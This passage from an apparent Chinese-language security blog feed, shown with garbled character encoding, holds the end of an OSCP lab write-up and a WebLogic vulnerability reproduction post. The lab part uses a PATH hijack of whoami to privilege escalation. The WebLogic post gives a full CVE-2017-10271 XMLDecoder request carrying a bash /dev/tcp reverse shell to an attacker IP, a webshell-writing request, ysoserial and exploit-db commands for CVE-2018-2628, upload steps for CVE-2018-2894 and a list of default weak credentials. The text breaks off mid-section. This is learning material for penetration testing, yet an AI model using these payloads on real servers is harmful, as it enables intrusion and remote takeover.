alt="image-20240520164607428"></p><p>ftp çš„é»˜è®¤å·¥ä½œè·¯å¾„åœ¨<code>/var/ftp</code>ï¼Œè”åˆftp ä¸Šä¼ webshellè¿›è¡ŒåŒ…å«</p><p><img src="/img/OSCP-Inclusiveness/image-20240520165148245.png" alt="image-20240520165148245"></p><p><img src="/img/OSCP-Inclusiveness/image-20240520165826526.png" alt="image-20240520165826526"></p><p>ä¹‹åå°†webshellåå¼¹åˆ°msfï¼Œè¿™é‡Œå°±ä¸æ¼”ç¤ºäº†</p><h2 id="äº”ã€æƒé™æå‡"><a href="#äº”ã€æƒé™æå‡" class="headerlink" title="äº”ã€æƒé™æå‡"></a>äº”ã€æƒé™æå‡</h2><h3 id="1ã€ææƒåˆ°tom"><a href="#1ã€ææƒåˆ°tom" class="headerlink" title="1ã€ææƒåˆ°tom"></a>1ã€ææƒåˆ°tom</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -user root -perm -4000 -print 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p><img src="/img/OSCP-Inclusiveness/image-20240520170743996.png" alt="image-20240520170743996"></p><p><code>/home/tom/rootshell</code>æ–‡ä»¶ç›¸å½“å¯ç–‘å•Š</p><p><img src="/img/OSCP-Inclusiveness/image-20240520170919194.png" alt="image-20240520170919194"></p><p>è¿˜æœ‰ä¸€ä¸ª<code>rootshell.c</code>æ–‡ä»¶ï¼Œç–‘ä¼¼æºä»£ç æ–‡ä»¶</p><p><img src="/img/OSCP-Inclusiveness/image-20240520172008695.png" alt="image-20240520172008695"></p><p>è¿™æ®µä»£ç å¤§è‡´çš„æ„æ€æ˜¯å¦‚æœwhoamiæ˜¯tom ï¼Œåˆ™è¾“å‡º<code>access ...</code>å¹¶é‡æ–°è¿›å…¥ä¸€ä¸ªshã€‚</p><p>é‡‡ç”¨ç¯å¢ƒå˜é‡ï¼Œä¼ªé€ ä¸€ä¸ªwhoami çš„å¯æ‰§è¡Œæ–‡ä»¶ï¼ŒåŠ«æŒçœŸæ­£çš„whoamiå‘½ä»¤</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cd /tmp ; echo &#x27;echo tom&#x27; &gt; whoami ; chmod +x whoami</span><br><span class="line"></span><br><span class="line">which whoami</span><br><span class="line">echo $PATH</span><br><span class="line">export PATH=/tmp:$PATH</span><br></pre></td></tr></table></figure><p><img src="/img/OSCP-Inclusiveness/image-20240520173328198.png" alt="image-20240520173328198"></p><p>å†æ¬¡æ‰§è¡Œ<code>rootshell</code> æ–‡ä»¶ï¼Œææƒåˆ°tom</p><p><img src="/img/OSCP-Inclusiveness/image-20240520173435588.png" alt="image-20240520173435588"></p><h3 id="2ã€ææƒåˆ°root"><a href="#2ã€ææƒåˆ°root" class="headerlink" title="2ã€ææƒåˆ°root"></a>2ã€ææƒåˆ°root</h3><p>é€šè¿‡<code>sudo -l</code>å‘ç°å…¨å‘½ä»¤å¯ç”¨ï¼Œç›´æ¥<code>sudo su</code>ææƒåˆ°root</p><p><img src="/img/OSCP-Inclusiveness/image-20240520173609057.png" alt="image-20240520173609057"></p><p>è·å–flag</p><p><img src="/img/OSCP-Inclusiveness/image-20240520173705535.png" alt="image-20240520173705535"></p>]]></content>
      
      
      <categories>
          
          <category> OSCPç³»åˆ—é¶åœº </category>
          
      </categories>
      
      
        <tags>
            
            <tag> oscp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€æ¼æ´å¤ç°ã€‘WebLogic ç³»åˆ—æ¼æ´å¤ç°</title>
      <link href="/2024/05/18/VulnRep-WebLogic/"/>
      <url>/2024/05/18/VulnRep-WebLogic/</url>
      
        <content type="html"><![CDATA[<h1 id="ã€æ¼æ´å¤ç°ã€‘WebLogic-ç³»åˆ—æ¼æ´å¤ç°"><a href="#ã€æ¼æ´å¤ç°ã€‘WebLogic-ç³»åˆ—æ¼æ´å¤ç°" class="headerlink" title="ã€æ¼æ´å¤ç°ã€‘WebLogic ç³»åˆ—æ¼æ´å¤ç°"></a>ã€æ¼æ´å¤ç°ã€‘WebLogic ç³»åˆ—æ¼æ´å¤ç°</h1><h2 id="ä¸€ã€WebLogic-æ¦‚è¿°"><a href="#ä¸€ã€WebLogic-æ¦‚è¿°" class="headerlink" title="ä¸€ã€WebLogic æ¦‚è¿°"></a>ä¸€ã€WebLogic æ¦‚è¿°</h2><p>WebLogicæ˜¯oracle å…¬å¸å‡ºå“çš„javaä¸­é—´ä»¶ï¼Œå¯ä¸Oracle äº§å“å’ŒæŠ€æœ¯ç›¸è¾…ç›¸æˆã€‚</p><p>å…¶é»˜è®¤çš„å¼€æ”¾ç«¯å£æ˜¯7001</p><p>é»˜è®¤åå°ç™»å½•åœ°å€ï¼š<a href="http://xxxx.xxx:7001/console">http://xxxx.xxx:7001/console</a></p><p>ä¸€äº›å¸¸è§çš„å¼±å£ä»¤</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">system:password</span><br><span class="line">weblogic:weblogic</span><br><span class="line">admin:secruity</span><br><span class="line">joe:password</span><br><span class="line">mary:password</span><br><span class="line">system:sercurity</span><br><span class="line">wlcsystem: wlcsystem</span><br><span class="line">weblogic:Oracle@123</span><br></pre></td></tr></table></figure><h2 id="äºŒã€XMLDecoderååºåˆ—åŒ–æ¼æ´ï¼ˆCVE-2017-10271ï¼‰"><a href="#äºŒã€XMLDecoderååºåˆ—åŒ–æ¼æ´ï¼ˆCVE-2017-10271ï¼‰" class="headerlink" title="äºŒã€XMLDecoderååºåˆ—åŒ–æ¼æ´ï¼ˆCVE-2017-10271ï¼‰"></a>äºŒã€XMLDecoderååºåˆ—åŒ–æ¼æ´ï¼ˆCVE-2017-10271ï¼‰</h2><h3 id="1ã€æ¼æ´åŸå› "><a href="#1ã€æ¼æ´åŸå› " class="headerlink" title="1ã€æ¼æ´åŸå› "></a>1ã€æ¼æ´åŸå› </h3><p>Weblogicçš„WLS Security ç»„ä»¶å¯¹å¤–æä¾›webserviceæœåŠ¡ï¼Œå…¶ä¸­ä½¿ç”¨äº†XMLDecoderæ¥è§£æç”¨æˆ·ä¼ å…¥çš„XMLæ•°æ®ï¼Œç”±äºXMLDecoderå¤„ç†ä¸å½“ï¼Œåœ¨è§£æçš„è¿‡ç¨‹ä¸­å‡ºç°ååºåˆ—åŒ–æ¼æ´ï¼Œå¯¼è‡´å¯æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚</p><h3 id="2ã€æ¼æ´å½±å“"><a href="#2ã€æ¼æ´å½±å“" class="headerlink" title="2ã€æ¼æ´å½±å“"></a>2ã€æ¼æ´å½±å“</h3><p>æ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¿™ä¸ªæ¼æ´å‘é€ç²¾å¿ƒæ„é€ çš„XMLæ•°æ®ï¼Œé€šè¿‡ååºåˆ—åŒ–æ‰§è¡Œä»»æ„å‘½ä»¤ï¼Œç”šè‡³å¯ä»¥é€šè¿‡åå¼¹shellæ‹¿åˆ°æƒé™ã€‚</p><h3 id="3ã€æ¼æ´æ¶‰åŠç‰ˆæœ¬"><a href="#3ã€æ¼æ´æ¶‰åŠç‰ˆæœ¬" class="headerlink" title="3ã€æ¼æ´æ¶‰åŠç‰ˆæœ¬"></a>3ã€æ¼æ´æ¶‰åŠç‰ˆæœ¬</h3><p>å—å½±å“çš„ç‰ˆæœ¬åŒ…æ‹¬ä½†ä¸é™äºï¼š</p><ol><li>OracleWebLogic Server 10.3.6.0.0</li><li>OracleWebLogic Server 12.1.3.0.0</li><li>OracleWebLogic Server 12.2.1.1.0</li><li>OracleWebLogic Server 12.2.1.2.0</li></ol><h3 id="4ã€æ¼æ´å¤ç°"><a href="#4ã€æ¼æ´å¤ç°" class="headerlink" title="4ã€æ¼æ´å¤ç°"></a>4ã€æ¼æ´å¤ç°</h3><p>é¦–é¡µå¦‚å›¾ï¼Œæ¼æ´ä¸åœ¨é¦–é¡µ</p><p><img src="/img/VulnRep-WebLogic/image-20240516155424032.png" alt="image-20240516155424032"></p><p>æˆ‘ä»¬éœ€è¦POSTæäº¤åˆ°<code>/wls-wsat/CoordinatorPortType</code>ï¼Œå¹¶é…åˆXMLDecoder è§£æxml æ•°æ®ï¼Œåœ¨è§£æè¿‡ç¨‹ä¸­å­˜åœ¨ååºåˆ—åŒ–æ¼æ´ï¼Œé€ æˆå‘½ä»¤æ‰§è¡Œã€‚</p><p>å‘½ä»¤åå¼¹æ•´ä½“æŠ¥æ–‡å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">POST /wls-wsat/CoordinatorPortType HTTP/1.1</span><br><span class="line">Host: 192.168.31.51:7001</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: text/xml</span><br><span class="line">Content-Length: 633</span><br><span class="line"></span><br><span class="line">&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt; &lt;soapenv:Header&gt;</span><br><span class="line">&lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;</span><br><span class="line">&lt;java version=&quot;1.4.0&quot; class=&quot;java.beans.XMLDecoder&quot;&gt;</span><br><span class="line">&lt;void class=&quot;java.lang.ProcessBuilder&quot;&gt;</span><br><span class="line">&lt;array class=&quot;java.lang.String&quot; length=&quot;3&quot;&gt;</span><br><span class="line">&lt;void index=&quot;0&quot;&gt;</span><br><span class="line">&lt;string&gt;/bin/bash&lt;/string&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;void index=&quot;1&quot;&gt;</span><br><span class="line">&lt;string&gt;-c&lt;/string&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;void index=&quot;2&quot;&gt;</span><br><span class="line">&lt;string&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/æ”»å‡»æœºçš„IP/ç›‘å¬çš„ç«¯å£ 0&amp;gt;&amp;amp;1&lt;/string&gt; </span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;/array&gt;</span><br><span class="line">&lt;void method=&quot;start&quot;/&gt;&lt;/void&gt;</span><br><span class="line">&lt;/java&gt;</span><br><span class="line">&lt;/work:WorkContext&gt;</span><br><span class="line">&lt;/soapenv:Header&gt;</span><br><span class="line">&lt;soapenv:Body/&gt;</span><br><span class="line">&lt;/soapenv:Envelope&gt;</span><br></pre></td></tr></table></figure><p>ç”±äºæˆ‘æ­¤æ—¶ç¯å¢ƒå‡†å¤‡ä¸å¤Ÿå……åˆ†ï¼Œåœ¨æ­¤åªå±•ç¤ºwebshell å†™å…¥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">POST /wls-wsat/CoordinatorPortType HTTP/1.1</span><br><span class="line">Host: 81.70.248.223:7002</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: text/xml</span><br><span class="line">Content-Length: 1164</span><br><span class="line"></span><br><span class="line">&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;</span><br><span class="line">     &lt;soapenv:Header&gt;</span><br><span class="line">     &lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;</span><br><span class="line">     &lt;java&gt;&lt;java version=&quot;1.4.0&quot; class=&quot;java.beans.XMLDecoder&quot;&gt;</span><br><span class="line">     &lt;object class=&quot;java.io.PrintWriter&quot;&gt;      &lt;string&gt;servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/test4.jsp&lt;/string&gt;</span><br><span class="line">     &lt;void method=&quot;println&quot;&gt;&lt;string&gt;</span><br><span class="line">     &lt;![CDATA[</span><br><span class="line"> /*å†°èé©¬çš„æ–‡ä»¶å†…å®¹*/</span><br><span class="line">     ]]&gt;</span><br><span class="line">     &lt;/string&gt;</span><br><span class="line">     &lt;/void&gt;</span><br><span class="line">     &lt;void method=&quot;close&quot;/&gt;</span><br><span class="line">     &lt;/object&gt;&lt;/java&gt;&lt;/java&gt;</span><br><span class="line">     &lt;/work:WorkContext&gt;</span><br><span class="line">     &lt;/soapenv:Header&gt;</span><br><span class="line">     &lt;soapenv:Body/&gt;</span><br><span class="line">&lt;/soapenv:Envelope&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æ–‡ä»¶å†™å…¥åœ¨<code>/bea_wls_internal/test4.jsp</code>ä¸­ï¼Œç”¨å†°èè¿›è¡Œè¿æ¥</p><p><img src="/img/VulnRep-WebLogic/image-20240516162202590.png" alt="image-20240516162202590"></p><h3 id="5ã€æ¼æ´ä¿®å¤"><a href="#5ã€æ¼æ´ä¿®å¤" class="headerlink" title="5ã€æ¼æ´ä¿®å¤"></a>5ã€æ¼æ´ä¿®å¤</h3><p>æ–¹æ³•ä¸€ï¼šåˆ é™¤wls-wsatç»„ä»¶ï¼Œç„¶åé‡å¯weblogic</p><p>æ–¹æ³•äºŒï¼šå®˜ç½‘ä¸‹è½½ï¼Œæ‰“è¡¥ä¸</p><h2 id="ä¸‰ã€WebLogicååºåˆ—åŒ–æ¼æ´ï¼ˆCVE-2018-2628ï¼‰"><a href="#ä¸‰ã€WebLogicååºåˆ—åŒ–æ¼æ´ï¼ˆCVE-2018-2628ï¼‰" class="headerlink" title="ä¸‰ã€WebLogicååºåˆ—åŒ–æ¼æ´ï¼ˆCVE-2018-2628ï¼‰"></a>ä¸‰ã€WebLogicååºåˆ—åŒ–æ¼æ´ï¼ˆCVE-2018-2628ï¼‰</h2><h3 id="1ã€æ¼æ´åŸå› -1"><a href="#1ã€æ¼æ´åŸå› -1" class="headerlink" title="1ã€æ¼æ´åŸå› "></a>1ã€æ¼æ´åŸå› </h3><p>WebLogic çš„T3åè®®æ˜¯WebLogic ä¸Java ä¹‹é—´è¿›è¡Œé€šè®¯çš„ä¸€ä¸ªåŸºäºJava RMIè¿œç¨‹æ–¹æ³•è°ƒç”¨çš„ä¸€ä¸ªåè®®ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡T3åè®®å‘é€æ¶æ„çš„çš„ååºåˆ—åŒ–æ•°æ®ï¼Œè¿›è¡Œååºåˆ—åŒ–ï¼Œå®ç°å¯¹å­˜åœ¨æ¼æ´çš„weblogicç»„ä»¶çš„è¿œç¨‹ä»£ç æ‰§è¡Œæ”»å‡»ã€‚</p><h3 id="2ã€æ¼æ´å½±å“-1"><a href="#2ã€æ¼æ´å½±å“-1" class="headerlink" title="2ã€æ¼æ´å½±å“"></a>2ã€æ¼æ´å½±å“</h3><p>T3åè®®åœ¨å¼€æ”¾WebLogicæ§åˆ¶å°ç«¯å£çš„åº”ç”¨ä¸Šé»˜è®¤å¼€å¯ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡T3åè®®å‘é€æ¶æ„çš„çš„ååºåˆ—åŒ–æ•°æ®ï¼Œåˆ©ç”¨RMIï¼ˆè¿œç¨‹æ–¹æ³•è°ƒç”¨ï¼‰æœºåˆ¶çš„ç¼ºé™·ï¼Œé€šè¿‡JRMPåè®®ï¼ˆjava è¿œç¨‹æ¶ˆæ¯äº¤æ¢åè®®ï¼‰å¯¼è‡´æœªæˆæƒç”¨æˆ·åœ¨è¿œç¨‹æœåŠ¡å™¨æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚</p><h3 id="3ã€æ¼æ´æ¶‰åŠç‰ˆæœ¬-1"><a href="#3ã€æ¼æ´æ¶‰åŠç‰ˆæœ¬-1" class="headerlink" title="3ã€æ¼æ´æ¶‰åŠç‰ˆæœ¬"></a>3ã€æ¼æ´æ¶‰åŠç‰ˆæœ¬</h3><ol><li>Oracle WebLogic Server 10.3.6.0</li><li>Oracle WebLogic Server 12.1.3.0</li><li>Oracle WebLogic Server 12.2.1.2</li><li>Oracle WebLogic Server 12.2.1.3</li></ol><h3 id="4ã€æ¼æ´å¤ç°-1"><a href="#4ã€æ¼æ´å¤ç°-1" class="headerlink" title="4ã€æ¼æ´å¤ç°"></a>4ã€æ¼æ´å¤ç°</h3><p>å¯å…ˆé€šè¿‡nmapè„šæœ¬<code>â€“script=weblogic-t3-info</code> æŸ¥çœ‹weblogicç‰ˆæœ¬ä¿¡æ¯å’Œt3åè®®æ˜¯å¦å¼€å¯</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap.exe -A -T4 -p 7001 IP</span><br></pre></td></tr></table></figure><p><img src="/img/VulnRep-WebLogic/image-20240516171815911.png" alt="image-20240516171815911"></p><p>çœ‹åˆ°T3åè®®åœ¨ä½¿ç”¨ï¼Œå¹¶ä¸”WebLogic çš„ç‰ˆæœ¬ä¿¡æ¯ä¸ºï¼š10.3.6.0</p><p>æŸ¥çœ‹<code>console</code> è·¯å¾„</p><p><img src="/img/VulnRep-WebLogic/image-20240516172014110.png" alt="image-20240516172014110"></p><p>è¿™é‡Œä½¿ç”¨ï¼š<a href="https://github.com/Lighird/CVE-2018-2628">CVE-2018-2628æ¼æ´å·¥å…·åŒ…</a></p><p>1ã€åˆ©ç”¨ <code>ysoserial-0.0.6-SNAPSHOT-BETA-all.jar</code>å¯åŠ¨ä¸€ä¸ªJRMP Server</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial-0.0.6-SNAPSHOT-BETA-all.jar ysoserial.exploit.JRMPListener 8080 CommonsCollections1 &#x27;touch /tmp/test.txt&#x27;</span><br><span class="line">&#x27;touch /tmp/test.txt&#x27;ä¸ºæˆ‘æƒ³æ‰§è¡Œçš„å‘½ä»¤ï¼Œ8080æ˜¯JRMP Serverç›‘å¬çš„ç«¯å£ã€‚</span><br></pre></td></tr></table></figure><p>2ã€ä¸‹è½½å¯¹åº”çš„expï¼š<a href="https://www.exploit-db.com/exploits/44553">https://www.exploit-db.com/exploits/44553</a></p><p><img src="/img/VulnRep-WebLogic/image-20240516175658008.png" alt="image-20240516175658008"></p><p>3ã€ä¿®æ”¹åç§°å¹¶å¯åŠ¨exp</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mv 44553 44553.py</span><br><span class="line"></span><br><span class="line">python 44553.py 172.24.0.2 7001 ysoserial-0.0.6-SNAPSHOT-BETA-all.jar 192.168.100.34 8080 JRMPClient</span><br></pre></td></tr></table></figure><p>4ã€è¿›å…¥dockerå®¹å™¨å¯ä»¥çœ‹åˆ°å­˜åœ¨<code>test.txt</code>æ–‡ä»¶</p><p><img src="/img/VulnRep-WebLogic/image-20240516180201425.png" alt="image-20240516180201425"></p><h3 id="5ã€æ¼æ´ä¿®å¤-1"><a href="#5ã€æ¼æ´ä¿®å¤-1" class="headerlink" title="5ã€æ¼æ´ä¿®å¤"></a>5ã€æ¼æ´ä¿®å¤</h3><ol><li>å…³é—­T3æœåŠ¡ï¼Œæˆ–æ§åˆ¶T3æœåŠ¡çš„è®¿é—®æƒé™(ä¸´æ—¶)ã€‚</li><li>æ‰“å®˜æ–¹è¡¥ä¸ã€‚</li></ol><h2 id="å››ã€ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´ï¼ˆCVE-2018-2894ï¼‰"><a href="#å››ã€ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´ï¼ˆCVE-2018-2894ï¼‰" class="headerlink" title="å››ã€ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´ï¼ˆCVE-2018-2894ï¼‰"></a>å››ã€ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´ï¼ˆCVE-2018-2894ï¼‰</h2><h3 id="1ã€æ¼æ´åŸå› -2"><a href="#1ã€æ¼æ´åŸå› -2" class="headerlink" title="1ã€æ¼æ´åŸå› "></a>1ã€æ¼æ´åŸå› </h3><p>Weblogicç®¡ç†ç«¯æœªæˆæƒçš„ä¸¤ä¸ªé¡µé¢å­˜åœ¨ä»»æ„ä¸Šä¼ jspæ–‡ä»¶æ¼æ´ï¼Œè¿›è€Œè·å–æœåŠ¡å™¨æƒé™ã€‚</p><p>CVE-2018-2894æ¼æ´æ˜¯ç”±äºWebLogic Serverä¸­çš„Web Service Test Pageå­˜åœ¨ä»»æ„æ–‡ä»¶ä¸Šä¼ çš„ç¼ºé™·ã€‚åœ¨â€œç”Ÿäº§æ¨¡å¼â€ä¸‹ï¼Œé»˜è®¤ä¸å¼€å¯Web Service Test Pageï¼Œå› æ­¤è¯¥æ¼æ´çš„åˆ©ç”¨å­˜åœ¨ä¸€å®šé™åˆ¶ã€‚æ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¯¥æ¼æ´ä¸Šä¼ ä»»æ„JSPæ–‡ä»¶ï¼Œè¿›è€Œå¯èƒ½è·å–æœåŠ¡å™¨æƒé™ã€‚</p><h3 id="2ã€æ¼æ´å½±å“-2"><a href="#2ã€æ¼æ´å½±å“-2" class="headerlink" title="2ã€æ¼æ´å½±å“"></a>2ã€æ¼æ´å½±å“</h3><p>åˆ©ç”¨CVE-2018-2894æ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥ä¸Šä¼ æ¶æ„çš„JSPæ–‡ä»¶åˆ°æœåŠ¡å™¨ï¼Œè¿™äº›æ–‡ä»¶å¯ä»¥ä½œä¸ºwebshellä½¿ç”¨ï¼Œå…è®¸æ”»å‡»è€…è¿œç¨‹æ‰§è¡Œä»£ç ï¼Œä»è€Œæ§åˆ¶æœåŠ¡å™¨ã€‚</p><h3 id="3ã€æ¼æ´æ¶‰åŠç‰ˆæœ¬-2"><a href="#3ã€æ¼æ´æ¶‰åŠç‰ˆæœ¬-2" class="headerlink" title="3ã€æ¼æ´æ¶‰åŠç‰ˆæœ¬"></a>3ã€æ¼æ´æ¶‰åŠç‰ˆæœ¬</h3><ol><li>Oracle WebLogic Server 10.3.6.0</li><li>Oracle WebLogic Server 12.1.3.0</li><li>Oracle WebLogic Server 12.2.1.2</li><li>Oracle WebLogic Server 12.2.1.3</li></ol><h3 id="4ã€æ¼æ´å¤ç°-2"><a href="#4ã€æ¼æ´å¤ç°-2" class="headerlink" title="4ã€æ¼æ´å¤ç°"></a>4ã€æ¼æ´å¤ç°</h3><p>1ã€æœªæˆæƒè®¿é—®<code>/ws_utc/config.do</code>é¡µé¢</p><p><img src="/img/VulnRep-WebLogic/image-20240516181742024.png" alt="image-20240516181742024"></p><p>ç”±äºåœ¨â€œç”Ÿäº§æ¨¡å¼â€ä¸‹ï¼Œé»˜è®¤ä¸å¼€å¯Web Service Test Pageï¼Œæ‰€ä»¥æ­¤å¤„éœ€è¦æˆ‘ä»¬æ‰‹åŠ¨é€šè¿‡ç®¡ç†å‘˜ç™»é™†åå°å»å¼€å¯ã€‚å…ˆçœ‹ä¸€ä¸‹ç®¡ç†å‘˜è´¦å·å¯†ç ï¼š<code>weblogic: TvrG557m</code></p><p><img src="/img/VulnRep-WebLogic/image-20240516182023018.png" alt="image-20240516182023018"></p><p>2ã€åœ¨<code>/console</code>ç™»å½•åå°</p><p><img src="/img/VulnRep-WebLogic/image-20240516182201233.png" alt="image-20240516182201233"></p><p>3ã€åœ¨åŸŸç»“æ„ä¸­å±•å¼€é«˜çº§é€‰é¡¹</p><p><img src="/img/VulnRep-WebLogic/image-20240517164549660.png" alt="image-20240517164549660"></p><p>å‹¾é€‰<code>å¯ç”¨WebæœåŠ¡æµ‹è¯•é¡µ</code>åä¿å­˜</p><p><img src="/img/VulnRep-WebLogic/image-20240517164637306.png" alt="image-20240517164637306"></p><p>4ã€å›åˆ°æœªæˆæƒè®¿é—®<code>/ws_utc/config.do</code>é¡µé¢</p><p>å°†<code>å½“å‰çš„å·¥ä½œç›®å½•</code>ä¿®æ”¹ä¸ºï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/u01/oracle/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/com.oracle.webservices.wls.ws-testclient-app-wls/4mcj4y/war/css</span><br></pre></td></tr></table></figure><p>5ã€æäº¤åæ¥åˆ°å®‰å…¨ï¼Œæ·»åŠ æ–‡ä»¶</p><p><img src="/img/VulnRep-WebLogic/image-20240517172013119.png" alt="image-20240517172013119"></p><p>æäº¤webshellï¼ŒBPæ‹¦æˆªï¼Œåœ¨å“åº”åŒ…çš„æœ€ä¸‹é¢æ‰¾åˆ°å¯¹åº”çš„æ—¶é—´æˆ³</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xxx.xxx:7001/ws_utc/css/config/keystore/æ—¶é—´æˆ³_22.jsp</span><br></pre></td></tr></table></figure><p>å³å¯è¿æ¥æˆåŠŸ</p><h3 id="5ã€æ¼æ´ä¿®å¤-2"><a href="#5ã€æ¼æ´ä¿®å¤-2" class="headerlink" title="5ã€æ¼æ´ä¿®å¤"></a>5ã€æ¼æ´ä¿®å¤</h3><ol><li>è®¾ç½®è®¿é—®æƒé™ï¼šç¡®ä¿ config.do å’Œ begin.do é¡µé¢åœ¨ç™»å½•æˆæƒåæ‰èƒ½è®¿é—®ï¼Œä»¥é˜²æ­¢æœªæˆæƒçš„æ–‡ä»¶ä¸Šä¼ å°è¯•ã€‚</li><li>ä½¿ç”¨å®‰å…¨äº§å“ï¼šè€ƒè™‘åœ¨å…¥ä¾µé˜²å¾¡ç³»ç»Ÿï¼ˆIPSï¼‰ç­‰å®‰å…¨äº§å“ä¸­åŠ å…¥ç›¸åº”çš„ç‰¹å¾ï¼Œä»¥å¸®åŠ©æ£€æµ‹å’Œé˜»æ­¢åˆ©ç”¨æ­¤æ¼æ´çš„å°è¯•ã€‚</li><li>å‡çº§åˆ°æœ€æ–°ç‰ˆæœ¬ï¼šå®‰è£… Oracle å®˜æ–¹æä¾›çš„æœ€æ–°è¡¥ä¸ï¼Œä»¥ä¿®å¤å·²çŸ¥çš„å®‰å…¨æ¼æ´ã€‚</li></ol><h2 id="äº”ã€WebLogicæœªæˆæƒå‘½ä»¤æ‰§è¡Œæ¼æ´ï¼ˆCVE-2020-14882ï¼‰"><a href="#äº”ã€WebLogicæœªæˆæƒå‘½ä»¤æ‰§è¡Œæ¼æ´ï¼ˆCVE-2020-14882ï¼‰" class="headerlink" title="äº”ã€WebLogicæœªæˆæƒå‘½ä»¤æ‰§è¡Œæ¼æ´ï¼ˆCVE-2020-14882ï¼‰"></a>äº”ã€WebLogicæœªæˆæƒå‘½ä»¤æ‰§è¡Œæ¼æ´ï¼ˆCVE-2020-14882ï¼‰</h2><h3 id="1ã€æ¼æ´åŸå› -3"><a href="#1ã€æ¼æ´åŸå› -3" class="headerlink" title="1ã€æ¼æ´åŸå› "></a>1ã€æ¼æ´åŸå› </h3><p>CVE-2020-14882 æ¼æ´æ˜¯ç”±äº Oracle WebLogic Server Console ä¸­å­˜åœ¨è·¯å¾„éå†æ¼æ´ï¼Œå…è®¸æ”»å‡»è€…æ„é€ ç‰¹æ®Šçš„ HTTP è¯·æ±‚æ¥ç»•è¿‡èº«ä»½éªŒè¯ï¼Œä»è€Œè®¿é—®å¹¶ä¿®æ”¹ç®¡ç†å‘˜æ§åˆ¶å°çš„æŸäº›èµ„æºã€‚è¿™å¯èƒ½å¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œï¼ˆRCEï¼‰ã€‚</p><h3 